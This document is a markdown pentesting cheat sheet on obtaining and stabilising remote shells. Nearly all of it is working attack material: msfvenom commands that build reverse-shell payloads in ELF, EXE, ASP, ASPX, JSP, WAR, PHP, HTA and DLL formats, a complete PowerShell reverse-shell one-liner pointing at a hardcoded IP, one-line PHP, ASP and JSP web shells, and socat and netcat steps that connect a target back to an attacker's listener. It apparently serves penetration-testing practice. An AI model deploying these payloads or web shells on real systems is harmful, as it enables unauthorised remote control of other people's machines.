# Shells

## Reverse shells


#### Linux - MSFVenom
```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

#### Windows - MSFVenom
```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```

#### Powershell
```
powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.194',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
#### ASP
```
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
```
#### ASPX
```
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f aspx > shell.aspx
```
#### JSP
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
```
#### WAR
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
```
#### PHP
```
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
```
#### HTA
```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f hta-psh > shell.hta
```

#### DLL
```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll > shell.dll
```

## Online Generator
<https://www.revshells.com/>
<https://weibell.github.io/reverse-shell-generator/>


## Single line Webshell

#### PHP
```
<?php echo passthru($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
```
#### ASP
```
<% eval request("cmd") %>
```
#### JSP
```
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

## Shell Stabilisation

#### Technique 01: Python
```
➤ Step 01 : uses Python to spawn a better featured bash shell
python -c 'import pty;pty.spawn("/bin/bash")'

➤ Step 02: this will give us access to term commands such as clear
export TERM=xterm

➤ Step 03: background the shell using Ctrl + Z
CRTL+Z

➤ Step 04: Back in our own terminal we use stty raw -echo; fg. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.
stty raw -echo; fg

Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type reset and press enter.

➤ Example: 
kiosec@lab:~$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.0.0.1] from (unknown) [10.1.1.1] 43298

python3 -c 'import pty;pty.spawn("/bin/bash")'
user@box:~$ export TERM=xterm
export TERM=xterm
user@box:~$ ^Z
[1]+ Stopped            sudo nc -lvnp 443
kiosec@lab:~$ stty rauw -echo; fg
nc -lvnp 443

user@box:~$ whoami
user
user@box:~$ ^C
user@box:~$
```

#### Technique 02: Rlwrap
rlwrap gives a more fully featured shell including access to history, tab autocompletion and the arrow keys immediately upon receiving a shell.
This technique is particularly useful with the Windows shell.
```
➤ Step 01: Install rlwrap (not installed by default on the kali)
apt install rlwrap

➤ Step 02: Invoke the listener.
rlwrap nc -lnvp <port> 

[additional steps for Linux target]
➤ Step 03: background the shell using Ctrl + Z
CRTL+Z

➤ Step 04: Back in our own terminal we use stty raw -echo; fg. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.
stty raw -echo; fg
```

#### Technique 3: Socat
Restricted to Linux target
```
➤ Prerequisite: Obtain Socat on the linux target.

➤ Step 01: Transfer a socat static compiled binary (e.g., using python http.server)
https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true

➤ Step 02: On the Kali
socat TCP-L:<port> FILE:`tty`,raw,echo=0

➤ Step 03: execute the reverse shell on the target.

➤ Step 04: Once connected to the target, execute the sepcial socal command in order to 
socat TCP:<kali-attacker-ip>:<kali-attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```
